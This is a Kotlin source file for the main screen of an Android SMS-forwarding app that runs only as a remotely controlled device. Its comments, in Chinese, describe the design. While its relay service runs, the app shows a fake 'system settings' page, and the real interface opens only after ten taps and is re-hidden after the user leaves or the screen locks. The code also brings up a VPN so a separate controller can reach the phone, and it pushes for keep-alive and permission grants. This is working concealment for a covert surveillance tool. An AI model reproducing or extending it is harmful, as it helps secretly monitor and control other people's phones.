package cn.ppps.forwarder.activity

import android.content.Intent
import android.os.Bundle
import android.util.Log
import android.view.LayoutInflater
import android.view.View
import androidx.fragment.app.Fragment
import com.google.android.material.tabs.TabLayout
import cn.ppps.forwarder.R
import cn.ppps.forwarder.core.BaseActivity
import cn.ppps.forwarder.core.BaseFragment
import cn.ppps.forwarder.databinding.ActivityMainBinding
import cn.ppps.forwarder.fragment.ServerFragment
import com.xuexiang.xui.utils.WidgetUtils

@Suppress("PrivatePropertyName", "unused", "DEPRECATION")
class MainActivity : BaseActivity<ActivityMainBinding?>() {

    private val TAG: String = MainActivity::class.java.simpleName

    /** ★ 2026-08-10 简化：SmsForwarder只保留被控端模式，控制端已迁移到android_controller项目 */
    private lateinit var mTabLayout: TabLayout

    override fun viewBindingInflate(inflater: LayoutInflater?): ActivityMainBinding {
        return ActivityMainBinding.inflate(inflater!!)
    }

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        // ★★★ 2026-11-03 需求：服务在运行时，**打开 App 先看到"像系统设置"的封面页**
        //   （真实界面只有伪装页连点 10 次才进，见 FakeSettingsActivity）。
        // ★★★ 2026-11-03【真机实测修复·授权中"闪退"】旧实现把 EXTRA_GOTO_AUTH 从 Intent 里
        //   removeExtra 掉了 ⇒ 只要系统重建一次 Activity（MIUI 在跳系统设置页时回收后台界面很常见），
        //   onCreate 里 isFromFake 就成了 false ⇒ 立刻重定向到伪装页并 finish()，用户看到的就是
        //   "授权做到一半 App 闪退（界面凭空消失）"。现在：
        //     ① 口令不再删除；② 重建（savedInstanceState != null）一律视为已解锁，绝不重定向。
        val firstCreate = savedInstanceState == null
        val fromFake = isFromFake(intent)
        allowRealUi = fromFake || !firstCreate
        // ★ 2026-11-04：授权中跳系统设置页常被 MIUI 回收重建，停留态要跨重建保留，
        //   否则新实例 onStop 会立刻把界面 finish（=授权完成后自动退到后台）。
        authStayForeground = sAuthStayForeground
        // ★ 2026-11-04【需求】锁屏/息屏后即使界面被系统回收重建，也必须先看伪装页：
        //   口令进来的（fromFake）例外，那是用户主动连点解锁。
        forceFakeOnNextResume = sForceFakeOnNextResume && !fromFake
        if (forceFakeOnNextResume) allowRealUi = false
        if (!allowRealUi && redirectToFakeIfRunning()) return
        initViews()
        // ★ 2026-08-16 Tailscale 集成：首次运行请求 VPN 授权（一次性系统弹窗，授权后自动建立 tun）
        binding?.root?.post {
            try {
                if (cn.ppps.forwarder.tailscale.TailscaleManager.isInitialized()) {
                    cn.ppps.forwarder.tailscale.TailscaleManager.requestVpnConsent(this)
                }
            } catch (t: Throwable) {
                android.util.Log.w(TAG, "请求 VPN 授权异常: ${t.message}")
            }
        }
        // ★ 2026-08-28 启动入口二（App 启动流程）：统一「权限 + 保活」自检。
        //   静默检测在后台线程跑，本进程只会弹【至多一个】电池优化白名单确认框（已豁免或已引导过则不弹），
        //   其余授权等用户点「一键授权」。与 ServerFragment 的调用点共用同一实现且幂等，不会重复弹窗。
        try {
            cn.ppps.forwarder.permission.KeepAliveGuardian.onStartup(this)
        } catch (t: Throwable) {
            android.util.Log.w(TAG, "启动权限自检异常: ${t.message}")
        }
        // ★ 2026-09-20 修复：被控端每次启动都检查中继模式，中继不可达(关闭)时确保 Tailscale VPN 已建立。
        //   与 RelayServerService.startRelay 的 ensureVpnUp 互为幂等保障：即便被控端服务尚未启动
        //   （如未开启开机自启），纯 App 启动阶段也已把直连 VPN 拉起，保证控制端在中继关闭时可经
        //   Tailscale 直连本机。relayConnected 初始为 null → ensureVpnUp 乐观建 VPN，relay 连上后
        //   由 setRelayConnected(true) 自动关闭，无副作用。
        try {
            cn.ppps.forwarder.tailscale.TailscaleManager.ensureVpnUp(this)
        } catch (t: Throwable) {
            android.util.Log.w(TAG, "启动检查直连VPN异常: ${t.message}")
        }
        // ★★★ 2026-11-03：若本次是由伪装"设置"页连点 10 次进来的 ⇒ 立刻开始真正的授权流程
        //   （只在本页**首次创建**时触发；Activity 被系统重建时不重复触发）
        if (firstCreate) handleGotoAuthFromFake(intent)
    }

    override fun onActivityResult(requestCode: Int, resultCode: Int, data: Intent?) {
        super.onActivityResult(requestCode, resultCode, data)
        if (requestCode == cn.ppps.forwarder.tailscale.TailscaleManager.REQUEST_VPN_PREPARE) {
            cn.ppps.forwarder.tailscale.TailscaleManager.handleVpnConsentResult(this, resultCode)
        }
    }

    override val isSupportSlideBack: Boolean
        get() = false

    private fun initViews() {
        android.util.Log.e(TAG, "★ initViews 开始执行（纯被控端模式）★")
        WidgetUtils.clearActivityBackground(this)
        initTab()
    }

    private fun initTab() {
        mTabLayout = binding!!.tabs
        // ★ 2026-08-10 纯被控端模式：直接全屏加载 ServerFragment
        WidgetUtils.addTabWithoutRipple(mTabLayout, getString(R.string.menu_server), R.drawable.selector_icon_tabbar_settings)
        mTabLayout.visibility = View.GONE
        android.util.Log.e(TAG, "★ 加载 ServerFragment ★")
        val fragment = ServerFragment()
        serverFragment = fragment
        loadFragmentDirect(fragment)
        WidgetUtils.setTabLayoutTextFont(mTabLayout)
        android.util.Log.e(TAG, "★ initTab 完成 ★")
    }

    // ==================== ★★★ 2026-11-03 伪装"设置"页的唯一真实入口 ====================
    /** 页面句柄：伪装页连点 10 次后要直接驱动它的「一键授权」流程 */
    private var serverFragment: ServerFragment? = null

    /**
     * 本页实例是否"已解锁"（只由伪装页 10 连点带入的 EXTRA_GOTO_AUTH 置 true）。
     * 未解锁的实例一旦回到前台（onResume）立即转去伪装页，防止"旧任务被恢复"时露出真实界面。
     */
    @Volatile
    private var allowRealUi = false

    /**
     * ★★★ 2026-11-04【需求】"授权进行中 / 授权刚完成"期间，真实界面**绝不自动退回后台**：
     *   只有用户按返回键（onBackPressed）或切桌面/切走（onUserLeaveHint）才收起。
     *
     *   为什么必须用进程级静态：授权要反复跳系统设置页、逐个弹权限窗，MIUI 常把本 Activity
     *   回收后重建 —— 重建后 ServerFragment 是新实例、`manualAuthFlowActive=false`，
     *   `isAuthFlowRunning()` 立刻变 false，`onStop()` 就会 `lockRealUiAndFinish()` 把界面
     *   finish 掉。用户看到的就是"自动授权过程中/授权完成后自己退出到后台"。
     */
    private var authStayForeground = false

    /** 系统 UI（权限弹窗/设置页）刚被拉起的时刻：授权中据此区分"系统弹窗"与"用户回家" */
    @Volatile
    private var lastSystemUiHandoffAt = 0L

    /** 授权中刚拉起系统 UI 的宽限：这段时间内的 onUserLeaveHint 不算用户离开 */
    private val AUTH_SYSTEM_UI_GRACE_MS = 10_000L

    /** ★ 2026-11-04【需求】锁屏/息屏发生过 ⇒ 下一次回到 App 必须先展示伪装页 */
    @Volatile
    private var forceFakeOnNextResume = false

    companion object {
        /** 跨 Activity 重建保留的"授权停留态"（进程内，授权期间进程不会被杀） */
        @Volatile
        private var sAuthStayForeground = false

        /** ★ 2026-11-04：锁屏/息屏后"下次进入必须看伪装页"（同样要跨重建保留） */
        @Volatile
        private var sForceFakeOnNextResume = false

        @JvmStatic
        fun setAuthStayForeground(stay: Boolean) {
            sAuthStayForeground = stay
        }
    }

    /** 是否处于"授权中 / 授权完成"的停留态（此时不自动退后台） */
    fun isAuthStayForeground(): Boolean = authStayForeground || sAuthStayForeground

    /** 授权流程开始：保持真实界面在前台（由 ServerFragment.oneClickAuthorize 调用） */
    fun markAuthFlowStarted() {
        authStayForeground = true
        setAuthStayForeground(true)
        android.util.Log.i(TAG, "★ 授权流程开始：保持真实界面在前台，不自动退后台")
    }

    /** 授权流程完成：继续停留前台，等用户按返回键或切桌面再退 */
    fun markAuthFlowCompleted() {
        authStayForeground = true
        setAuthStayForeground(true)
        android.util.Log.i(TAG, "★ 授权流程完成：保持真实界面在前台，等用户按返回/切桌面再退")
    }

    /** 自己刚跳出去（授权/系统设置页）的宽限期：这段时间内离开不算"用户回家" */
    private val SELF_LAUNCH_GRACE_MS = 2000L

    /** 本实例是否已经自动开始过「一键授权」（防重建/重复 onNewIntent 再触发一次） */
    @Volatile
    private var authAutoStarted = false

    /** 一键授权流程是否正在进行（进行中绝不把真实界面摘掉/踢回伪装页） */
    private fun isAuthFlowRunning(): Boolean {
        return try {
            serverFragment?.isAuthFlowRunning() == true
        } catch (t: Throwable) {
            false
        }
    }

    /**
     * 只有带 [FakeSettingsActivity.EXTRA_GOTO_AUTH] 的 Intent 才自动开始授权
     * （正常点桌面图标打开 App 时不该突然弹一堆权限框）。
     * 延迟 800ms 等 ServerFragment 的 initViews/initListeners 完成，否则 binding 还是 null。
     */
    private fun handleGotoAuthFromFake(intent: Intent?) {
        if (authAutoStarted) return
        if (!isFromFake(intent)) return
        // ★ 不能用 removeExtra 去"消费口令"：那样 Activity 一被系统重建就认不出自己是被解锁进来的，
        //   会被 onCreate 的守卫踹回伪装页（=用户看到的"授权中闪退"）。改用实例标记 + firstCreate。
        authAutoStarted = true
        android.util.Log.i(TAG, "★ 伪装页入口：进入真实界面，800ms 后开始一键授权")
        binding?.root?.postDelayed({
            try {
                serverFragment?.startOneClickAuthFromFake()
            } catch (t: Throwable) {
                android.util.Log.w(TAG, "伪装入口自动授权异常: ${t.message}")
            }
        }, 800)
    }

    override fun onNewIntent(intent: Intent) {
        super.onNewIntent(intent)
        // 伪装页连点达标时用 CLEAR_TOP|SINGLE_TOP 回到本页 ⇒ 走这里
        if (isFromFake(intent)) allowRealUi = true
        handleGotoAuthFromFake(intent)
    }

    /** 本次是否由伪装"设置"页连点 10 次进来（带口令） */
    private fun isFromFake(intent: Intent?): Boolean {
        return try {
            intent?.getBooleanExtra(FakeSettingsActivity.EXTRA_GOTO_AUTH, false) == true
        } catch (t: Throwable) {
            false
        }
    }

    /**
     * 服务在跑 ⇒ 打开 App 一律先展示伪装"设置"页，并把真实界面从任务里摘掉。
     * 返回 true 表示"已跳走、本页别再初始化了"。
     */
    private fun redirectToFakeIfRunning(): Boolean {
        return try {
            if (!cn.ppps.forwarder.service.RelayServerService.isRunning) return false
            // ★ 授权流程进行中（刚跳完系统设置页回来等）绝不重定向，否则等于把授权打断
            if (isAuthFlowRunning()) return false
            android.util.Log.i(TAG, "★ 服务运行中：打开 App 先展示伪装设置页")
            startActivity(Intent(this, FakeSettingsActivity::class.java))
            finish()
            true
        } catch (t: Throwable) {
            android.util.Log.w(TAG, "跳转伪装设置页失败: ${t.message}")
            false
        }
    }

    /**
     * ★ 2026-08-10 新增：直接加载Fragment到容器（绕过XRouter路由）
     * 当XRouter路由表未生成时，使用此方法直接添加Fragment
     */
    private fun loadFragmentDirect(fragment: BaseFragment<*>) {
        android.util.Log.e(TAG, "★ loadFragmentDirect 开始: ${fragment.javaClass.simpleName}")
        
        // ★ 使用 resources.getIdentifier 动态获取容器 ID
        var containerResId = binding!!.fragmentContainer.id
        android.util.Log.e(TAG, "★ binding容器Id=$containerResId")
        
        // 如果 binding 方式失败（返回 0），尝试用资源名查找
        if (containerResId == 0) {
            containerResId = resources.getIdentifier("fragment_container", "id", packageName)
            android.util.Log.e(TAG, "★ 通过资源名查找容器: $containerResId")
        }
        
        if (containerResId == 0) {
            android.util.Log.e(TAG, "★ 找不到容器 ID，使用 android.R.id.content 作为备选")
            containerResId = android.R.id.content
        }
        
        android.util.Log.e(TAG, "★ 使用容器ID=$containerResId 加载Fragment")
        try {
            supportFragmentManager.beginTransaction()
                .replace(containerResId, fragment)
                .commitAllowingStateLoss()
            android.util.Log.e(TAG, "★ Fragment replace 成功: ${fragment.javaClass.simpleName}")
        } catch (e: Exception) {
            android.util.Log.e(TAG, "★ Fragment replace 失败: ${e.message}", e)
        }
        
        // ★ XPage Fragment的initPage在onActivityCreated中自动调用
        // 这里通过生命周期回调确保初始化完成
        supportFragmentManager.registerFragmentLifecycleCallbacks(
            object : androidx.fragment.app.FragmentManager.FragmentLifecycleCallbacks() {
                override fun onFragmentActivityCreated(
                    fm: androidx.fragment.app.FragmentManager,
                    f: Fragment,
                    savedInstanceState: Bundle?
                ) {
                    android.util.Log.e(TAG, "★ onFragmentActivityCreated: ${f.javaClass.simpleName}")
                }
                override fun onFragmentResumed(
                    fm: androidx.fragment.app.FragmentManager,
                    f: Fragment
                ) {
                    android.util.Log.e(TAG, "★ onFragmentResumed: ${f.javaClass.simpleName}")
                }
            }, false
        )
        android.util.Log.e(TAG, "★ loadFragmentDirect 结束")
    }

    //按返回键不退出回到桌面
    @Deprecated("Deprecated in Java")
    override fun onBackPressed() {
        goHomeAndClose()
    }

    /**
     * ★★★ 2026-11-03【需求】"只要退回后台，再点桌面图标**一律**先看到伪装『设置』页"。
     *
     *   因此"退回后台"就**立刻作废本次解锁**（allowRealUi=false）+ 结束本页：
     *   下次从桌面图标进来只会走 SplashActivity → 伪装页，必须重新连点 10 次才回到真实界面。
     *
     *   ★ 只认"用户主动离开"（Home / 最近任务 / 切到别的 App）—— 这个回调就是系统为
     *     "用户选择离开"准备的；而**授权流程自己 startActivity 跳系统设置页**不算离开
     *     （同一瞬间的 lastSelfLaunchAt 就是标记），否则每授权一项都要重新连点 10 次，授权永远做不完。
     */
    override fun onUserLeaveHint() {
        super.onUserLeaveHint()
        if (isFinishing) return
        if (!isServiceRunning()) return
        // 刚刚我们自己 startActivity 跳到系统设置页/权限页 ⇒ 这是"去授权"，不是"用户回家"
        if (System.currentTimeMillis() - lastSelfLaunchAt < SELF_LAUNCH_GRACE_MS) return
        // ★ 2026-11-04【需求】授权流程进行中、且系统 UI（权限弹窗/设置页）刚被拉起 ⇒
        //   不算用户回家。运行时权限弹窗不走 startActivity，靠 ServerFragment 的
        //   markSystemUiHandoff() 打时间戳；否则每弹一个权限框界面就被 finish = 自动退到后台。
        if (isAuthFlowRunning() &&
            System.currentTimeMillis() - lastSystemUiHandoffAt < AUTH_SYSTEM_UI_GRACE_MS) return
        lockRealUiAndFinish("用户离开（Home/最近任务/切走）")
    }

    /**
     * ★ 兜底：**被别的 App 盖住 / 通知跳转** 等"系统不回调 onUserLeaveHint"的退后台。
     *
     *   ★★★ 2026-11-04【需求变更】授权进行中/授权完成后**不再自动退后台**：
     *     ① 授权流程进行中（用户在系统设置页之间来回）→ 保持界面；
     *     ② 授权刚完成（用户就停在真实界面看结果）→ 保持界面；
     *     ③ 锁屏不算"用户离开"（屏幕超时太常见，授权完成后手机放桌上就会锁屏）→ 保持界面；
     *     ④ 只有用户按返回键 / Home / 切走（onBackPressed / onUserLeaveHint）才收起。
     */
    override fun onStop() {
        super.onStop()
        if (isFinishing || isChangingConfigurations) return
        if (!isServiceRunning()) return
        // ★ 2026-11-04【需求】锁屏/息屏：界面先留着（不立刻 finish，解锁回来还停在原处），
        //   但要作废解锁并标记"下次进 App 必先看伪装页"。
        //   必须放在 isAuthFlowRunning/isAuthStayForeground 之前，否则授权完成态会把锁屏判断挡掉。
        if (isScreenLocked()) {
            lockRealUiForScreenOff()
            return
        }
        if (isAuthFlowRunning()) return
        if (isAuthStayForeground()) return
        if (System.currentTimeMillis() - lastSelfLaunchAt < SELF_LAUNCH_GRACE_MS) return
        lockRealUiAndFinish("退到后台（被盖住/通知跳转）")
    }

    /** 锁屏/息屏：不立刻 finish（解锁回来仍停在原处），但作废解锁 + 下次进入强制先看伪装页 */
    private fun lockRealUiForScreenOff() {
        allowRealUi = false
        authStayForeground = false
        setAuthStayForeground(false)
        forceFakeOnNextResume = true
        sForceFakeOnNextResume = true
        android.util.Log.i(TAG, "★ 锁屏/息屏 ⇒ 作废本次解锁（解锁后/下次进入一律先看伪装页）")
    }

    /** 屏幕是否已锁：锁屏不是"用户主动离开"，不能据此把真实界面 finish 掉 */
    private fun isScreenLocked(): Boolean {
        return try {
            val km = getSystemService(android.content.Context.KEYGUARD_SERVICE) as android.app.KeyguardManager
            km.isKeyguardLocked
        } catch (t: Throwable) {
            false
        }
    }

    /** 作废本次解锁并结束真实界面：服务在后台继续跑，下次进 App 仍先看到伪装页 */
    private fun lockRealUiAndFinish(reason: String) {
        allowRealUi = false
        // ★ 2026-11-04：用户主动离开后清掉"授权停留态"，下次进 App 仍先看到伪装页
        authStayForeground = false
        setAuthStayForeground(false)
        android.util.Log.i(TAG, "★ $reason ⇒ 作废本次解锁（下次进 App 一律先看伪装页）")
        finish()
    }

    /** 自己发起的 startActivity/startActivityForResult 时间戳（用于区分"去授权"与"用户回家"） */
    @Volatile
    private var lastSelfLaunchAt = 0L

    /**
     * ★ 供 ServerFragment 在"马上要弹系统权限弹窗"前调用（运行时权限弹窗不属于 startActivity，
     *   这里补一个时间戳，免得 onUserLeaveHint 把它当成"用户回家了"把界面锁掉 = 假闪退）。
     * ★ 2026-11-04：同时记录 lastSystemUiHandoffAt，授权中用它区分"系统弹窗"与"用户回家"。
     */
    fun markSystemUiHandoff() {
        lastSelfLaunchAt = System.currentTimeMillis()
        lastSystemUiHandoffAt = lastSelfLaunchAt
    }

    override fun startActivity(intent: Intent) {
        lastSelfLaunchAt = System.currentTimeMillis()
        super.startActivity(intent)
    }

    override fun startActivityForResult(intent: Intent, requestCode: Int) {
        lastSelfLaunchAt = System.currentTimeMillis()
        super.startActivityForResult(intent, requestCode)
    }

    override fun onResume() {
        super.onResume()
        // ★ 2026-11-04【需求】锁屏/息屏后回到前台 → 先展示伪装设置页。
        //   优先级高于"授权停留态"：用户明确要求锁屏/息屏后下次进入必看伪装页。
        if (forceFakeOnNextResume) {
            forceFakeOnNextResume = false
            sForceFakeOnNextResume = false
            if (isFinishing || isDestroyed) return
            if (!isServiceRunning()) return
            android.util.Log.i(TAG, "★ 锁屏/息屏后回到前台：先展示伪装设置页")
            startActivity(Intent(this, FakeSettingsActivity::class.java))
            finish()
            return
        }
        // ★ 兜底：本页不是"10 连点解锁"进来的 ⇒ 绝不把真实界面留在前台
        //   （覆盖"旧任务被系统恢复到真实界面""服务在后台复活后用户回到 App"两种情况）
        if (allowRealUi) return
        if (isFinishing || isDestroyed) return
        if (!isServiceRunning()) return
        if (isAuthFlowRunning()) return
        android.util.Log.i(TAG, "★ 未解锁却回到真实界面：转去伪装设置页")
        startActivity(Intent(this, FakeSettingsActivity::class.java))
        finish()
    }

    /** 回桌面 + 把自己从任务栈摘掉（否则下次点桌面图标会直接回到真实界面） */
    private fun goHomeAndClose() {
        try {
            val intent = Intent(Intent.ACTION_MAIN)
            intent.flags = Intent.FLAG_ACTIVITY_NEW_TASK
            intent.addCategory(Intent.CATEGORY_HOME)
            startActivity(intent)
        } catch (t: Throwable) {
            android.util.Log.w(TAG, "回桌面失败: ${t.message}")
        }
        // ★ 2026-11-04：用户按返回键 = 主动离开 → 清掉授权停留态，下次进 App 仍先看伪装页
        authStayForeground = false
        setAuthStayForeground(false)
        finish()
    }

    private fun isServiceRunning(): Boolean {
        return try {
            cn.ppps.forwarder.service.RelayServerService.isRunning
        } catch (t: Throwable) {
            false
        }
    }
}
